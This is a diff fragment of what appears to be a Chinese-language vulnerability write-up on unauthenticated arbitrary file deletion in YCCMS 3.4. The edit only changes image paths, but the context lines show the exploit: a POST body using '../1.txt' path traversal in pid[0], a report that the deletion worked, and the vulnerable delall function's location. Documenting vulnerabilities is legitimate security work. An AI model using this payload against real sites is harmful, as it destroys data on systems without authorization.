@@ -27,7 +27,7 @@ YCCMS 3.4
 
     pid%5B0%5D=../1.txt&chkall=on&send=%E5%88%A0%E9%99%A4%E9%80%89%E4%B8%AD%E5%9B%BE%E7%89%87t
 
-只需要更改pid\[0\]即可在无登录条件下任意删除文件，删除根目录下的1.txt![3.png](/Users/aresx/Documents/VulWiki/.resource/YCCMS3.4任意文件删除/media/rId24.png)已经删除成功了![4.png](/Users/aresx/Documents/VulWiki/.resource/YCCMS3.4任意文件删除/media/rId25.png)其实这还是犯了一个最容易犯的错误，没有对传进来的路径进行过滤就拼接了目录，导致了任意文件删除漏洞的产生根据url定位到相关函数位置,位于/controller/PicAction.class.php
+只需要更改pid\[0\]即可在无登录条件下任意删除文件，删除根目录下的1.txt![3.png](./.resource/YCCMS3.4任意文件删除/media/rId24.png)已经删除成功了![4.png](./.resource/YCCMS3.4任意文件删除/media/rId25.png)其实这还是犯了一个最容易犯的错误，没有对传进来的路径进行过滤就拼接了目录，导致了任意文件删除漏洞的产生根据url定位到相关函数位置,位于/controller/PicAction.class.php
 
     public function delall(){
             if(isset($_POST['send'])){
